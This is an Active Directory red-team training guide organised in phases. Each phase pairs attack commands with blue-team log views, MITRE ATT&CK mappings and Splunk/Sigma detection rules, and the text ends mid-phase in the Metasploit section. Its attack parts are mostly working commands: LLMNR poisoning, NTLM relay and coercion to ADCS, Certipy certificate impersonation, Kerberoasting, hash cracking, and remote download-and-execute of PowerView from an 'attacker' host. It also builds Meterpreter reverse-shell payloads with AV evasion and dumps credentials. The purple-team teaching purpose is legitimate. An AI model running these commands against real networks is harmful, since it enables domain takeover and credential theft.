# HOW TO USE THIS DOCUMENT (IMPORTANT)

This file is **NOT a cheat sheet**.
Each phase contains:

- **Red-Team Goal**
- **Student Lab (hands-on)**
- **Tool Descriptions** (what / how / when / why)
- **Success Criteria**
- **Blue-Team View**
- **MITRE ATT&CK Mapping**
- **Detection Ideas**
- **Modern Attack Examples & Commands**

**Instructor Rule**

Students cannot advance without explaining what a defender would see.

# MITRE ATT&CK LOG SOURCE DETECTION MATRIX

## Purpose

This tutorial maps **MITRE ATT&CK techniques** to **real Windows Active Directory log sources** and **practical SOC detections**.

It is designed to:

- Teach SOC analysts _where attacks appear_
- Help detection engineers validate **log coverage**
- Support purple-team exercises and gap analysis
- Serve as an instructor reference for AD attack labs

This is **not theory**. Every section answers:

1. What technique is used?
2. What logs expose it?
3. What behavior proves malicious intent?

---

## LOGGING PREREQUISITES (CRITICAL)

Before any detection is possible, the following **must be enabled**:

### Domain Controllers

- Advanced Audit Policy
- Directory Service Access
- Kerberos Authentication Service
- Kerberos Service Ticket Operations
- Account Logon / Logon
- Object Access
- AD Diagnostic Logging (LDAP 1644)
- PowerShell Script Block Logging (4104)

### Infrastructure

- DNS logs
- Firewall / NDR telemetry
- ADCS logs (if certificate services exist)
- Centralized log collection (SIEM)

If these are not enabled, **detections will fail regardless of tooling**.

---

# PHASE 1 – RECONNAISSANCE

## Red-Team Goal

Identify hosts, services, and Active Directory presence **without exploitation**.

## Tool Description – Nmap

**Nmap** is a network discovery and service enumeration tool used to identify live hosts, open ports, running services, and OS fingerprints. It is used **before authentication** to understand the attack surface. In enterprise environments, Nmap is often the **first detectable attacker action**.

**Use Nmap:**

- At the start of an engagement
- When mapping unknown networks
- To confirm AD infrastructure via ports

## Tool Description – Masscan (Added Extension)

**Masscan** is a high-speed network scanner similar to Nmap but optimized for scanning large IP ranges quickly. It uses asynchronous transmission to achieve speeds up to 10 million packets per second. Use it **when speed is critical** in large-scale reconnaissance, such as scanning entire subnets or the internet, but follow up with Nmap for detailed service enumeration.

**Example Use Cases:**

- Initial broad sweeps to identify live hosts.
- Combining with tools like ZMap for even faster scans.

**Command Example:**

```bash
masscan -p1-65535 172.28.128.0/24 --rate=1000
```

**Why Use It:** Reduces time in reconnaissance phase while minimizing detection if rate-limited properly.

## Modern Attack Example: Stealth Recon with ZMap + Nmap Hybrid

**Scenario:** Quickly find all domain controllers in a /16 network while minimizing dwell time.

```bash
# Step 1: Fast TCP SYN scan for port 389 (LDAP) across entire subnet
zmap -p 389 10.10.0.0/16 -o ldap_hosts.txt --rate=50000

# Step 2: Targeted Nmap version detection on discovered hosts
nmap -sV -sC -p 88,389,445,636 -iL ldap_hosts.txt -oA dc_enum

# Step 3: Use Nmap's NSE for AD-specific checks (less noisy than full port scan)
nmap --script ldap-rootdse,smb-os-discovery -p 389,445 -iL dc_candidates.txt
```

## LAB – Network Recon

```bash
nmap -sn 172.28.128.0/24
nmap -sC -sV -p- <TARGET>
nmap -p 53,88,389,445,636 <DC_IP>
```

## Success Criteria

- Student identifies the Domain Controller
- Student explains why the discovered ports indicate AD

## Blue-Team View

- Firewall logs (5156, 5158) showing port scans
- IDS alerts for host/port scanning patterns
- Windows Security logs showing connection attempts

## MITRE ATT&CK Mapping

- **T1046** – Network Service Discovery
- **T1018** – Remote System Discovery

## Detection Ideas

```kql
// Splunk SPL - Detect Horizontal Scans
| tstats `security_content_summariesonly` count from datamodel=Network_Traffic.All_Traffic
  where All_Traffic.dest_port IN (53, 88, 135, 139, 389, 445, 636)
  by All_Traffic.src_ip, All_Traffic.dest_ip, _time span=1h
| eventstats dc(All_Traffic.dest_ip) as unique_targets by All_Traffic.src_ip
| where unique_targets > 20
| table _time, All_Traffic.src_ip, unique_targets

// Sigma Rule - Nmap Scan Detection
title: Nmap Port Scan Detection
description: Detects Nmap-style port scanning activity
logsource:
    product: windows
    service: firewall
detection:
    selection:
        EventID: 5156
        DestinationPort:
            - '22'
            - '80'
            - '443'
            - '3389'
        ProcessName: 'nmap.exe'
    condition: selection
```

---

# PHASE 2 – SMB ENUMERATION & NTLM POISONING

## Red-Team Goal

Extract identities and shared resources **without valid credentials**.

## Tool Description – enum4linux-ng

`enum4linux-ng` automates **SMB, RPC, and NetBIOS enumeration**. It queries Windows systems for users, groups, shares, and policies using anonymous or low-privileged access. It is used **early** to identify misconfigurations.

## Tool Description – CrackMapExec (CME)

CrackMapExec is an **Active Directory post-exploitation framework** used for credential validation, enumeration, and lateral actions at scale. It simulates how attackers **operate across real enterprise networks**.

## Tool Description – smbclient

`smbclient` is a **legitimate SMB client** for interacting with Windows shares. Because it uses normal SMB behavior, it often **bypasses simplistic detection**. Attackers use it to browse SYSVOL, scripts, and configuration files.

## Tool Description – Responder (Added Extension)

**Responder** is a LLMNR, NBT-NS, and mDNS poisoner that captures and relays NTLM hashes from network broadcasts. Use it **passively** in reconnaissance to harvest credentials from misconfigured networks without direct interaction. It's ideal for internal networks where multicast protocols are enabled.

**Example Use Cases:**

- Poisoning responses to capture hashes for cracking or relay.
- Combining with NTLMRelayx for relay attacks.

**Command Example:**

```bash
responder -I eth0 -rdwv
```

**Why Use It:** Provides opportunistic credential access early in the chain, blending into network noise.

## Modern Attack Example: Coercion + Relay with PetitPotam + ntlmrelayx

**Scenario:** Force a Domain Controller to authenticate to attacker-controlled machine and relay to ADCS for certificate theft.

```bash
# Step 1: Start NTLM relay to ADCS (ESC8 attack)
ntlmrelayx.py -t http://adcs.domain.local/certsrv/certfnsh.asp \
  --adcs \
  --template DomainController \
  -smb2support

# Step 2: Coerce authentication from DC using modern coercion tool
python3 Coercer.py -u service_account -p 'Password123!' -d domain.local \
  -l attacker_ip \
  --target dc01.domain.local \
  --listener-mode http

# Step 3: Automate certificate request and authentication
certipy req -u 'DOMAIN\\Administrator' -p '' -pfx administrator.pfx \
  -ca ca.domain.local \
  -target dc01.domain.local \
  -template DomainController
```

## LAB – SMB Enumeration

```bash
# Modern NetExec (nxc) approach
nxc smb 172.28.128.0/24 --gen-relay-list targets.txt

# SMB share enumeration with authentication
crackmapexec smb <TARGET> -u 'username' -p 'password' --shares

# Anonymous enumeration with updated tools
enum4linux-ng -A <TARGET> -oY enum_output.yaml

# Capture NTLM with Responder + MultiRelay
responder -I eth0 -dwFP --lm
```

## Success Criteria

- Enumerates ≥3 shares including SYSVOL
- Captures at least one NTLM hash via poisoning
- Explains LLMNR/NBT-NS poisoning mechanism

## Blue-Team View

- Security Event 4624 (Logon Type 3) with ANONYMOUS LOGON
- DNS logs showing LLMNR queries
- SMB server logs showing anonymous access attempts

## MITRE ATT&CK Mapping

- **T1135** – Network Share Discovery
- **T1557.001** – Adversary-in-the-Middle (LLMNR/NBT-NS)

## Detection Ideas

```kql
// Splunk SPL - Detect LLMNR/NBT-NS Poisoning
index=windows EventCode=4624 LogonType=3
  Account_Name="ANONYMOUS LOGON"
| stats count by src_ip, dest_ip, _time
| where count > 5

// Sigma Rule - NTLM Relay Detection
title: NTLM Authentication to Non-Domain Controllers
description: Detects NTLM auth to servers that shouldn't receive it
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 3
        AuthenticationPackage: NTLM
        ComputerName:
            - '*DC*'
            - '*SQL*'
            - '*WEB*'
    filter:
        ComputerName: '*PRINT*'  # False positive for print servers
    condition: selection and not filter
```

---

# PHASE 3 – LDAP ENUMERATION

## Red-Team Goal

Query Active Directory for structured identity and privilege data.

## Tool Description – ldapsearch

`ldapsearch` is a **raw LDAP query tool** that directly queries directory objects. It is **powerful but noisy**, producing verbose directory logs. It is used when precision or custom filters are required.

## Tool Description – windapsearch

`windapsearch` is an AD-focused LDAP enumeration tool that simplifies common queries (users, groups, SPNs). It is preferred for **speed and clarity** during engagements.

## Tool Description – ADExplorer (Added Extension)

**ADExplorer** is a graphical tool from Sysinternals for browsing and searching Active Directory objects. Use it **interactively** to explore AD structure, attributes, and permissions without writing queries. It's great for visual learners or when scripting isn't feasible.

**Example Use Cases:**

- Dumping schema details or searching for specific OUs.
- Exporting data for offline analysis.

**Usage Example:** Launch ADExplorer.exe, connect to DC with credentials, and browse/search.

**Why Use It:** Provides a user-friendly alternative to command-line tools for deeper understanding.

## Modern Attack Example: Stealthy LDAP Enumeration with ADSearch

**Scenario:** Enumerate high-value targets without triggering volume-based alerts.

```powershell
# Use ADSearch (modern .NET tool) with result limiting
.\ADSearch.exe --search "(&(objectCategory=person)(objectClass=user)(adminCount=1))"
  --attributes samaccountname,memberof --limit 100

# Enumerate constrained delegation configurations
.\ADSearch.exe --search "(msDS-AllowedToDelegateTo=*)"
  --attributes samaccountname,msDS-AllowedToDelegateTo

# Find users with SPNs for Kerberoasting (stealthy batch)
.\ADSearch.exe --search "(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
  --attributes samaccountname,serviceprincipalname,pwdlastset
  --pagesize 50  # Smaller pages to blend in
```

## LAB – LDAP Enumeration

### Example Commands – ldapsearch

```bash
# Anonymous enumeration if allowed
ldapsearch -x -H ldap://<DC_IP> -b "DC=example,DC=com" "(objectClass=user)" sAMAccountName 2>/dev/null

# Authenticated enumeration with modern filters
ldapsearch -x -H ldap://<DC_IP> -D "user@domain.local" -w 'password' \
  -b "DC=domain,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
  sAMAccountName userPrincipalName pwdLastSet badPwdCount

# Find privileged groups and members
ldapsearch -x -H ldap://<DC_IP> -D "user@domain.local" -w 'password' \
  -b "CN=Users,DC=domain,DC=local" "(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local)" \
  sAMAccountName
```

### Example Commands – windapsearch

```bash
# Modern windapsearch with JSON output
windapsearch --dc <DC_IP> -u "user@domain.local" -p 'password' --module users --json

# Enumerate for BloodHound without running SharpHound
windapsearch --dc <DC_IP> -u "user@domain.local" -p 'password' \
  --module groups --full --output groups.txt
```

## Success Criteria

- Enumerates ≥ 5 users and ≥ 2 groups
- Identifies at least one service account with SPN
- Explains LDAP filters and SPN value

## Blue-Team View

- Event ID **1644** – LDAP searches
- Event ID **1138** – LDAP binds
- Directory Service access logs

## MITRE ATT&CK Mapping

- **T1087** – Account Discovery
- **T1069** – Permission Groups Discovery

## Detection Ideas

```kql
// Splunk SPL - Detect LDAP Enumeration
index=windows EventCode=1644
| stats dc(SearchFilter) as unique_filters,
  sum(ResultCount) as total_results,
  count by src_ip, _time span=15m
| where total_results > 1000 OR unique_filters > 10

// Sigma Rule - Suspicious LDAP Queries
title: Suspicious LDAP Query Patterns
description: Detects enumeration-style LDAP queries
logsource:
    product: windows
    service: directory-service
detection:
    selection:
        EventID: 1644
        SearchFilter:
            - '(servicePrincipalName=*)'
            - '(adminCount=1)'
            - '(memberOf=*)'
        ResultCount: '>100'
    condition: selection
```

---

# PHASE 4 – BLOODHOUND / AD MAPPING

## Red-Team Goal

Identify attack paths to high privilege **without guessing**.

## Tool Description – BloodHound / SharpHound

BloodHound uses graph theory to map **Active Directory trust relationships**. SharpHound collects data via LDAP, SMB, and RPC to answer: _Who can become Domain Admin, and how?_

## Tool Description – PowerView (Added Extension)

**PowerView** is a PowerShell script for Active Directory enumeration and attack path discovery. Use it **in-memory** to query AD without installing tools, focusing on users, groups, and ACLs. It's a lightweight alternative or complement to BloodHound for quick checks.

**Example Use Cases:**

- Finding domain admins or delegation rights.
- Exporting data for BloodHound ingestion.

**Command Example:**

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
Get-DomainUser -Identity "krbtgt" -Properties *
Find-DomainShare -CheckShareAccess
```

**Why Use It:** Runs natively on Windows, evading some EDR if loaded reflectively.

## Modern Attack Example: Stealthy BloodHound Collection

**Scenario:** Collect AD data without triggering PowerShell/SMB alerts.

```bash
# Use SharpHound with stealth options
SharpHound.exe --CollectionMethod DCOnly --ExcludeDomainControllers --Stealth

# Use AzureHound for hybrid environments
azurehound list --tenant-id <TENANT_ID> --client-id <APP_ID> --client-secret <SECRET>

# Alternative: Use BloodHound.py for non-Windows collectors
bloodhound-python -d domain.local -u user -p 'password' -ns <DC_IP> -c All

# Memory-only PowerView collection
$MemoryStream = New-Object System.IO.MemoryStream
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadData('http://attacker/SharpHound.ps1') | %{$MemoryStream.Write($_, 0, $_.Length)}
[Reflection.Assembly]::Load($MemoryStream.ToArray())
Invoke-BloodHound -CollectionMethod Session,LoggedOn -Stealth
```

## LAB – BloodHound Data Collection and Analysis

```bash
# Modern SharpHound with compression and throttling
SharpHound.exe --CollectionMethods All --ZipFileName bh_data.zip --Throttle 100 --Jitter 23

# Python-based collector (cross-platform)
bloodhound-python -d domain.local -u 'user' -p 'password' -c All -ns <DC_IP>

# Neo4j Cypher queries for attack paths
MATCH p=shortestPath((u:User {name:'USER@DOMAIN.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}))
RETURN p

# Find shortest path to Domain Admin from compromised user
MATCH (c:Computer), (da:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})
MATCH p=shortestPath((c)-[*1..]->(da))
WHERE c.owned = true
RETURN p
```

## Success Criteria

- Successful data collection without detection
- Identifies ≥ 1 DA path from low-privileged user
- Explains ACL-based vs group-based escalation

## Blue-Team View

- PowerShell Event ID **4104** (script block logging)
- Security Event **4688** (process creation)
- Unusual LDAP/SMB volume patterns

## MITRE ATT&CK Mapping

- **T1069** – Permission Groups Discovery
- **T1482** – Domain Trust Discovery

## Detection Ideas

```kql
// Splunk SPL - Detect BloodHound Collection
index=windows (EventCode=4104 OR EventCode=4688)
  (ProcessName="powershell.exe" OR ProcessName="SharpHound.exe")
| search "SharpHound" OR "BloodHound" OR "Get-Domain" OR "Find-*"
| stats count by src_ip, ProcessName, CommandLine, _time

// Sigma Rule - SharpHound Detection
title: BloodHound/SharpHound Process Execution
description: Detects execution of AD enumeration tools
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 1
        Image|endswith:
            - '\SharpHound.exe'
            - '\AzureHound.exe'
        CommandLine|contains:
            - '--CollectionMethod'
            - '-c All'
    condition: selection
```

---

# PHASE 5 – KERBEROS ABUSE

## Red-Team Goal

Extract crackable credentials **without touching endpoints**.

## Tool Description – Rubeus (Extended)

**Rubeus** is a C# tool for Kerberos manipulation, including roasting, ticket forging, and pass-the-ticket attacks. Modern versions support AES encryption, constrained delegation abuse, and cross-domain attacks.

**Example Use Cases:**

- Harvesting TGTs from memory or performing overpass-the-hash.
- Renewing or purging tickets for OpSec.

**Command Example:**

```bash
# Harvest tickets from memory
Rubeus.exe harvest /interval:30

# Perform s4u self+proxy for constrained delegation
Rubeus.exe s4u /user:websvc /rc4:<NTLM_HASH> /impersonateuser:administrator
  /msdsspn:cifs/dc.domain.local /altservice:ldap

# Create silver ticket with AES support
Rubeus.exe silver /user:administrator /domain:domain.local /sid:S-1-5-21-...
  /aes256:<AES_KEY> /target:dc.domain.local /service:cifs
```

## Modern Attack Example: Kerberoasting with RC4 Downgrade + AS-REP Roasting

**Scenario:** Extract both service account and user account hashes in one attack chain.

```bash
# Step 1: Force RC4 encryption for easier cracking (if allowed)
# Modify account to use RC4_HMAC_MD5
python3 setspn.py domain.local/user:'Password123!' -s host/dc.domain.local -u targetuser

# Step 2: Kerberoast with RC4 downgrade
GetUserSPNs.py -request -outputfile kerberoast.txt -dc-ip <DC_IP>
  domain.local/user:'Password123!' -hashes :<NTLM_HASH>

# Step 3: AS-REP roast all users without pre-auth
python3 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat
  -outputfile asreproast.txt -dc-ip <DC_IP>

# Step 4: Crack with hashcat using modern rules
hashcat -m 13100 kerberoast.txt -a 0 /usr/share/wordlists/rockyou.txt -r rules/InsidePro-PasswordsPro.rule
hashcat -m 18200 asreproast.txt -a 3 ?u?l?l?l?l?l?d?d -i
```

## LAB – Kerberos Attacks

### AS-REP Roasting (No Credentials Needed if Vulnerable Accounts Exist)

```bash
# Modern tool with automatic user enumeration
python3 GetNPUsers.py domain.local/ -dc-ip <DC_IP> -format john -outputfile asrep_hashes.txt

# Target specific vulnerable users
Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast /nowrap

# Enumerate users without pre-auth using LDAP first
ldapsearch -x -H ldap://<DC_IP> -D "user@domain.local" -w 'password' \
  -b "DC=domain,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName
```

### Kerberoasting (Authenticated)

```bash
# Modern Impacket with stealth options
GetUserSPNs.py -request -outputfile kerberoast_hashes.txt -dc-ip <DC_IP>
  domain.local/user:'Password123!' -hashes :<NTLM_HASH>

# Rubeus with advanced filtering
Rubeus.exe kerberoast /outfile:kerberoast.txt /nowrap /rc4opsec

# Enumerate all SPNs first for targeting
windapsearch --dc <DC_IP> -u user@domain.local -p 'password'
  --custom "(&(objectClass=user)(servicePrincipalName=*))"
  --attrs samaccountname,serviceprincipalname,pwdlastset
```

## Success Criteria

- Extracts both AS-REP and TGS hashes
- Cracks at least one hash to plaintext
- Explains RC4 vs AES encryption implications

## Blue-Team View

- Event ID **4768** (TGT requests)
- Event ID **4769** (TGS requests)
- Event ID **4624** (Kerberos logons)

## MITRE ATT&CK Mapping

- **T1558.001** – AS-REP Roasting
- **T1558.003** – Kerberoasting
- **T1550.003** – Pass the Ticket

## Detection Ideas

```kql
// Splunk SPL - Detect Kerberoasting
index=windows EventCode=4769
| stats count by Ticket_Encryption_Type, Client_Address, Service_Name, _time
| where Ticket_Encryption_Type=0x17  # RC4_HMAC_MD5
| where count > 10

// Sigma Rule - AS-REP Roasting
title: AS-REP Roasting Detection
description: Detects accounts with pre-auth disabled being targeted
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4768
        PreAuthType: 0
        TicketOptions: '0x40810000'
    condition: selection
```

---

# PHASE 5.5 – OFFLINE CREDENTIAL CRACKING

## Red-Team Goal

Crack harvested hashes from Kerberoast/AS-REP offline to recover plaintext passwords.

## Modern Attack Example: Advanced Hash Cracking with Rules and Masks

**Scenario:** Crack complex corporate passwords using modern techniques.

```bash
# Step 1: Prepare custom rule file for corporate passwords
cat > custom.rule << EOF
# Capitalize first letter, append year
c $?$?$?$? $?$?$?$? 20^[0-9]
# Add special characters
$?$?$?$? $?$?$?$? $!$@$#$$%^&*()
# Season+Year patterns
$?$?$?$? $?$?$?$? [Ss]ummer[0-9][0-9]
$?$?$?$? $?$?$?$? [Ww]inter[0-9][0-9]
EOF

# Step 2: Crack with hashcat using multiple strategies
# Strategy 1: Wordlist + rules
hashcat -m 13100 kerberoast.txt -a 0 rockyou.txt -r custom.rule -O

# Strategy 2: Mask attack for password policies
hashcat -m 13100 kerberoast.txt -a 3 ?u?l?l?l?l?d?d?d?s -i --increment-min=8

# Strategy 3: Hybrid attack (word + mask)
hashcat -m 18200 asrep.txt -a 6 rockyou.txt ?d?d?d?d

# Step 3: Use cracking clusters for large hash sets
hashcat --brain-server --brain-password MySecret
hashcat -m 13100 kerberoast.txt -a 0 wordlist.txt --brain-client
```

## LAB – Offline Cracking

```bash
# Prepare custom wordlist from target organization
cewl https://company.com -d 3 -m 6 -w company_words.txt

# Combine with common passwords
cat rockyou.txt company_words.txt > combined.txt

# Crack with John using KoreLogic rules
john --format=krb5tgs kerberoast.txt --wordlist=combined.txt --rules=KoreLogic

# Use Hashtopolis for distributed cracking
# Server: hashtopolis.zip
# Agents connect to server for hash distribution

# GPU-optimized cracking with optimized kernels
hashcat -m 13100 -w 4 -O -u 256 --kernel-accel=1600 kerberoast.txt combined.txt
```

## Success Criteria

- Recovers ≥2 passwords from hashes
- Demonstrates multiple cracking strategies
- Explains password policy implications

---

# PHASE 5.6 – NTLM RELAY & COERCION ATTACKS

## Red-Team Goal

Force/coerce NTLM authentication from machines and relay to high-value targets.

## Modern Attack Example: ADCS Relay + Resource-Based Constrained Delegation

**Scenario:** Full chain from coercion to Domain Admin.

```bash
# Step 1: Start relay to ADCS (ESC8)
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp \
  --adcs \
  --template DomainController \
  --rbcd \
  -smb2support \
  --output-file relayed_creds.txt

# Step 2: Coerce multiple protocols simultaneously
python3 Coercer.py -u service_account -p 'Password123!' -d domain.local \
  -l attacker_ip \
  --target dc01.domain.local \
  --listener-mode all \
  --delay 2

# Step 3: Automate RBCD after cert theft
certipy shadow auto -u 'DOMAIN\\Administrator' -p '' -pfx administrator.pfx \
  -account COMPROMISED$ \
  -target dc01.domain.local

# Step 4: Request service ticket with RBCD
Rubeus.exe s4u /user:COMPROMISED$ /rc4:<NTLM_HASH>
  /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.local
  /altservice:http,host,rpcss,wsman,ldap
```

## LAB – NTLM Relay with Modern Coercion

```bash
# Multi-relay setup with multiple targets
ntlmrelayx.py -tf targets.txt \
  --http-port 8080 \
  --smb-port 445 \
  --adcs \
  --shadow-credentials \
  --dump-laps \
  --dump-gmsa \
  --escalate-user

# Use KrbRelay for Kerberos relay (bypasses EPA)
python3 KrbRelay.py --target http://ca.domain.local/certsrv/ \
  --attack ESC8 \
  --output cert.pfx

# Relay to multiple protocols simultaneously
impacket-ntlmrelayx --no-smb-server --no-http-server \
  --targets targets.txt \
  --protocol all \
  --dump \
  --no-da
```

## Success Criteria

- Successfully relays authentication to ADCS
- Obtains certificate for privileged account
- Explains EPA/channel binding bypasses

## Blue-Team View

- Event ID 4624 (Type 3 from DC to unusual hosts)
- ADCS Event IDs 4886–4889 (certificate requests)
- Windows Defender for Identity alerts

## MITRE ATT&CK Mapping

- **T1557.001** – Adversary-in-the-Middle
- **T1606** – Forge Web Credentials

## Detection Ideas

```kql
// Splunk SPL - Detect NTLM Relay
index=windows EventCode=4624 LogonType=3
| where AuthenticationPackage="NTLM"
| stats count by Workstation_Name, src_ip, Logon_Process, _time
| where count > 5 AND Workstation_Name LIKE "*DC*"

// Sigma Rule - ADCS Certificate Theft
title: Suspicious ADCS Certificate Request
description: Detects abnormal certificate requests
logsource:
    product: windows
    service: adcs
detection:
    selection:
        EventID: 4886
        Requester:
            - '*$'  # Machine account
            - 'ANONYMOUS LOGON'
        CertificateTemplate:
            - 'DomainController'
            - 'Administrator'
            - 'WebServer'
    condition: selection
```

---

# PHASE 6 – ADCS (CERTIFICATE ABUSE)

## Red-Team Goal

Exploit misconfigured Active Directory Certificate Services (AD CS) to impersonate privileged users, obtain authentication certificates, and achieve privilege escalation or persistence — often leading to Domain Admin access without traditional credential theft.

## Tool Description – Certipy

**Certipy** (by ly4k) is the leading modern Python tool for enumerating, abusing, and attacking AD CS environments. It identifies vulnerable templates (ESC1–ESC16), requests rogue certificates, performs NTLM relay to AD CS (ESC8), handles shadow credentials, and supports PKINIT authentication. Preferred over older tools like Certify due to active maintenance, stealth options, and full ESC coverage.

**Use Certipy:**

- During enumeration (find vulnerable templates)
- For exploitation (request/forge certificates)
- Post-exploitation (authenticate with stolen certs, shadow creds)
- In labs with AD CS servers (like your ca01-esc)

## Modern Attack Example: ESC1 + ESC8 Chain (Certificate Impersonation & Relay)

**Scenario:** Low-priv user requests a certificate impersonating Domain Admin (ESC1), or relays NTLM to steal a DC cert (ESC8) for full domain takeover.

```bash
# Step 1: Enumerate vulnerable templates (run from Kali against your lab DC)
certipy find -u 'alice.adams@lab.local' -p 'Passw0rd!' -dc-ip 172.28.128.21 --vulnerable -output adcs_find

# Step 2: Exploit ESC1 (Enrollee Supplies Subject + Client Auth EKU)
# Request certificate with admin UPN/SAN from vulnerable template (e.g., VulnESC1 on ca01-esc)
certipy req -u 'alice.adams@lab.local' -p 'Passw0rd!' \
  -ca 'LAB-ESC-CA' -template 'VulnESC1' \
  -upn 'administrator@lab.local' \
  -dns 'dc01.lab.local' -target 'ca01-esc.lab.local' \
  -dc-ip 172.28.128.21

# Step 3: Authenticate as administrator using the obtained certificate (PKINIT)
certipy auth -pfx 'administrator.pfx' -dc-ip 172.28.128.21

# Step 4: ESC8 (NTLM Relay to AD CS) – Coerce DC auth & steal cert
# Start relay (from Kali)
ntlmrelayx.py -t http://ca01-esc.lab.local/certsrv/certfnsh.asp --adcs --template DomainController -smb2support

# In another terminal: Coerce authentication (e.g., using PetitPotam/Coercer)
coercer.py coerce -u 'svc_delegate@lab.local' -p 'ServiceP@ss3' \
  -t dc01.lab.local -l 172.28.128.10 --always-succeed

# After relay success → use stolen DC cert for persistence or further attacks
```

## LAB – ADCS Abuse

_(Assumes your ca01-esc VM at 172.28.128.25 is domain-joined and has vulnerable templates like VulnESC1)_

```bash
# From Kali (172.28.128.10)
# 1. Enumerate AD CS (find vulnerable templates)
certipy find -u 'alice.adams@lab.local' -p 'Passw0rd!' -dc-ip 172.28.128.21 --vulnerable --text

# 2. Request ESC1 certificate impersonating administrator
certipy req -u 'alice.adams@lab.local' -p 'Passw0rd!' \
  -ca 'LAB-ESC-CA' -template 'VulnESC1' \
  -upn 'administrator@lab.local' \
  -target 'ca01-esc.lab.local' -dc-ip 172.28.128.21

# 3. Authenticate with the cert (obtain TGT + NT hash)
certipy auth -pfx 'administrator.pfx' -dc-ip 172.28.128.21

# 4. Optional: Shadow credentials persistence on a computer account
certipy shadow auto -pfx 'administrator.pfx' -account 'WIN10$' -target 'win10.lab.local'

# 5. Test ESC8 relay (requires coercion setup)
ntlmrelayx.py -t http://ca01-esc.lab.local/certsrv/certfnsh.asp --adcs --template DomainController
# Then coerce from another session (e.g., using your svc_delegate account)
```

## Success Criteria

- Identifies ≥2 vulnerable templates (e.g., VulnESC1, VulnESC2)
- Successfully requests and uses a certificate for Domain Admin impersonation
- Authenticates via PKINIT and retrieves NT hash or TGT
- Explains difference between ESC1 (template abuse) and ESC8 (relay)

## Blue-Team View

- AD CS Operational logs on CA01-ESC (Event Viewer → Applications and Services Logs → Microsoft → Windows → CertificateServices)
- Security Event IDs on CA01-ESC:
  - 4886 – Certificate Services received a certificate request
  - 4887 – Certificate Services approved and issued a certificate
  - 4888 – Certificate Services denied a certificate request
  - 4889 – Certificate Services set request to pending
  - 4898 – Certificate Services loaded a template
  - 4899 – Certificate template was updated
  - 4900 – Certificate template security permissions changed
- After cert usage: Event ID 4768 on DC (TGT request with PreAuthType=16 for PKINIT)
- Unusual requester vs. subject mismatch (SAN/UPN spoofing)

## MITRE ATT&CK Mapping

- **T1649** – Steal or Forge Authentication Certificates (primary)
- **T1550.003** – Use Alternate Authentication Material: Pass the Certificate
- **T1606** – Forge Web Credentials (related to relay scenarios)

## Detection Ideas

```kql
// Splunk/KQL - Detect Suspicious Certificate Requests (ESC1/ESC8 indicators)
index=windows EventCode IN (4886, 4887)
| eval requester = Requester, subject = mvindex(split(Attributes, "Subject="), 1)
| where requester != subject OR match(subject, "(?i)administrator|domain admin")
| stats count by requester, subject, EventCode, _time
| where count > 1 OR requester="*lowpriv*"
| table _time, requester, subject, EventCode
```

```yaml
# Sigma Rule - ADCS ESC1 Abuse (SAN Mismatch)
title: ADCS Certificate Request with Suspicious SAN
id: adcs-esc1-san-abuse
status: experimental
description: Detects certificate requests where SAN/UPN does not match requester (ESC1 indicator)
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID:
      - 4886
      - 4887
    Attributes|contains:
      - "SubjectAltName="
      - "@" # UPN present
  filter_own:
    Requester|contains: "Requester="
    Attributes|contains: "Requester=" # simplistic; refine with regex
  condition: selection and not filter_own
level: high
```

**Monitor for:**

- Low-priv users requesting certs with privileged SAN (e.g., administrator@lab.local)
- Requests to DomainController template from non-DC accounts
- Spike in 4886/4887 events on CA server

---

# PHASE 7 – METASPLOIT FRAMEWORK (MODERN)

## Red-Team Goal

Achieve controlled exploitation and post-exploitation with modern evasion.

## Modern Attack Example: Staged Attack with Custom Malleable C2

**Scenario:** Deploy Meterpreter with full evasion chain.

```bash
# Step 1: Generate fully undetectable payload with custom template
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tunnel.domain.com LPORT=443 \
  -e x86/shikata_ga_nai -i 15 -f raw \
  -x /opt/sysinternals/ProcExp.exe \
  -k --smallest \
  -o payload.bin

# Step 2: Create custom resource script for automation
cat > attack.rc << EOF
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST tunnel.domain.com
set LPORT 443
set ExitOnSession false
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set StagerVerifySSLCert true
set HandlerSSLCert /opt/certs/legit.pem
set OverrideLHOST legit.domain.com
set OverrideRequestHost true
exploit -j -z

# Post-exploitation automation
sessions -c "load kiwi; creds_all"
sessions -c "run post/windows/gather/hashdump"
sessions -c "run post/multi/manage/autoroute"
EOF

# Step 3: Execute with custom malleable C2 profile
msfconsole -r attack.rc -o /dev/null 2>&1 &

# Step 4: Use advanced post modules
msf6 > use post/windows/manage/migrate
msf6 > set SESSION 1
msf6 > set PROCESS explorer.exe
msf6 > run

msf6 > use post/windows/gather/credentials/gpp
msf6 > set SESSION 1
msf6 > run
```

## LAB – Modern Metasploit Usage

```bash
# Setup HTTPS listener with legitimate certificate
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set LHOST legit.domain.com
msf6 > set LPORT 443
msf6 > set HandlerSSLCert /etc/ssl/certs/legit.pem
msf6 > set StagerVerifySSLCert true
msf6 > set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
msf6 > exploit -j

# Use modern evasion modules
msf6 > use evasion/windows/applocker_evasion_install_util
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set LHOST attacker.com
msf6 > generate -f exe -o bypass.exe

